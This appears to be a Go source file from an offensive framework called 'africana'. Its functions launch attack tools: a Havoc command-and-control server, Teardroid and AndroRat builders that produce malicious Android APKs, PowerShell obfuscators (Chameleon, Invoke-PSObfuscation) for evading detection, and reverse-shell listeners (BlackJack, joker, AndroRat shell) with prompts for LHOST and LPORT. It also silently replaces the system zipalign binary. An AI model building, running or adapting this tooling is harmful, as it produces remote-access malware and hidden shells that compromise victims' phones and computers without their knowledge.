package butchers

import (
    "os"
    "fmt"
    "time"
    "utils"
    "bufio"
    "strings"
    "bcolors"
    "subprocess"
)

var(
    userInput   string
    userTarget  string
    userLhost   string
    userLPort   string
    userHport   string
    userMalware string
    userScript  string
    userOutput  string
)

func Havoc() {
    Logs := fmt.Sprintf("/root/.africana/logs/Havoc.Log-%s.txt", time.Now().Format("20060102.150405"))
    subprocess.PopenTwo(`script -q -c 'havoc client & havoc server -d -v' -O %s`, Logs); fmt.Println()
}

func Shellz() {
    Logs := fmt.Sprintf("/root/.africana/logs/Shellz.Log-%s.txt", time.Now().Format("20060102.150405"))
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/shells/; bash shells' -O %s`, Logs); fmt.Println()
}

func MeterPeter() {
    Logs := fmt.Sprintf("/root/.africana/logs/MeterPeter.Log-%s.txt", time.Now().Format("20060102.150405"))
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/meterpeter/; pwsh meterpeter.ps1' -O %s`, Logs); fmt.Println()
}

func TearDroid() {
    Logs := fmt.Sprintf("/root/.africana/logs/TearDroid.Log-%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "africana.apk" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userMalware, _ := reader.ReadString('\n')
    userMalware = strings.TrimSpace(userMalware)
    if userMalware == "" {
        userMalware = "africana.apk"
    }
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/Teardroid-phprat/; python3 Teardroid.py -b %s' -O %s`,userMalware, Logs); fmt.Println()
}

func Chameleon() {
    Logs := fmt.Sprintf("/root/.africana/logs/Chameleon.Log-%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Full path to your " + bcolors.PURPLE + ".Ps1" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userScript)
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userOutput, _ := reader.ReadString('\n')
    userOutput = strings.TrimSpace(userOutput)
    if userOutput == "" {
        userOutput = "/root/.africana/output/leviathan.txt"
    }
    subprocess.PopenFour(`script -q -c 'cd /root/.africana/africana-base/chameleon/; python3 chameleon.py -a %s -o %s' -O %s`, userScript, userOutput, Logs); fmt.Println()
}

func Gh0x0st() {
    Logs := fmt.Sprintf("/root/.africana/logs/Gh0x0st.Log-%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Full path to your " + bcolors.PURPLE + ".Ps1" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userScript)
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userOutput, _ := reader.ReadString('\n')
    userOutput = strings.TrimSpace(userOutput)
    if userOutput == "" {
        userOutput = "/root/.africana/output/levuathan.txt"
    }
    subprocess.PopenFour(`script -q -c 'cd /root/.africana/africana-base/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s' -O %s`, userScript, userOutput, Logs); fmt.Println()
}

func BlackJack() {
    Logs := fmt.Sprintf("/root/.africana/logs/BlackJack.Log-%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "use" + bcolors.ENDC + ": " + bcolors.BLUE + bcolors.ITALIC + "1. " + bcolors.YELLOW + "TCP " + bcolors.BLUE + "2. " + bcolors.YELLOW + "HTTPS " + bcolors.BLUE + "or " + bcolors.BLUE + "0. " + bcolors.PURPLE + "Go back" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userInput, _ := reader.ReadString('\n')
    userInput = strings.TrimSpace(userInput)
    if userInput == "" {
        userInput = "1"
    }
    switch userInput {
    case "0":
        return
    case "1":
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        reader := bufio.NewReader(os.Stdin)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/blackjack/; python3 BlackJack.py -i -s -n %s' -O %s`, userLport, Logs); fmt.Println()
    case "2":
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        reader := bufio.NewReader(os.Stdin)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "HPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "3333" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userHport, _ := reader.ReadString('\n')
        userHport = strings.TrimSpace(userHport)
        if userHport == "" {
            userHport = "3333"
        }
        subprocess.PopenFour(`script -q -c 'cd /root/.africana/africana-base/blackjack/; python3 BlackJack.py -i -s -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -x %s -n %s' -O %s`, userLport, userHport, Logs); fmt.Println()
    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
}

func PowerJoker() {
    Logs := fmt.Sprintf("/root/.africana/logs/PowerJoker.Log-%s.txt", time.Now().Format("20060102.150405"))
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userLhost, _ := reader.ReadString('\n')
    userLhost = strings.TrimSpace(userLhost)
    if userLhost == "" {
        userLhost = userLhostIp
    }
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userLport, _ := reader.ReadString('\n')
    userLport = strings.TrimSpace(userLport)
    if userLport == "" {
        userLport = "9999"
    }
    subprocess.PopenFour(`script -q -c 'cd /root/.africana/africana-base/joker/; python3 joker.py -l %s -p %s' -O %s`, userLhost, userLport, Logs); fmt.Println()
}

func AndroRat() {
    Logs := fmt.Sprintf("/root/.africana/logs/AndroRat.Log-%s.txt", time.Now().Format("20060102.150405"))
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    filePath := "/usr/bin/zipalign.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        fmt.Println(); subprocess.Popen(`mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana; apt-get install /root/.africana/africana-base/androrat/zipalign_8.1.0.deb --allow-downgrades -y`)
    }
    fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userLhost, _ := reader.ReadString('\n')
    userLhost = strings.TrimSpace(userLhost)
    if userLhost == "" {
        userLhost = userLhostIp
    }
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userLport, _ := reader.ReadString('\n')
    userLport = strings.TrimSpace(userLport)
    if userLport == "" {
        userLport = "9999"
    }
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output name " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "africana.apk" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userMalware, _ := reader.ReadString('\n')
    userMalware = strings.TrimSpace(userMalware)
    if userMalware == "" {
        userMalware = "africana.apk"
    }
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userOutput, _ := reader.ReadString('\n')
    userOutput = strings.TrimSpace(userOutput)
    if userOutput == "" {
        userOutput = "/root/.africana/output/"
    }
    subprocess.PopenFive(`script -q -c 'cd /root/.africana/africana-base/androrat/; python3 androrat.py --build -i %s -p %s -o %s' -O %s`, userLhost, userLport, userOutput + userMalware + ".apk", Logs)
    subprocess.PopenFour(`script -q -c 'cd /root/.africana/africana-base/androrat/; python3 androrat.py --shell -i %s -p %s' -O %s`, userLhost, userLport, Logs); fmt.Println()
}
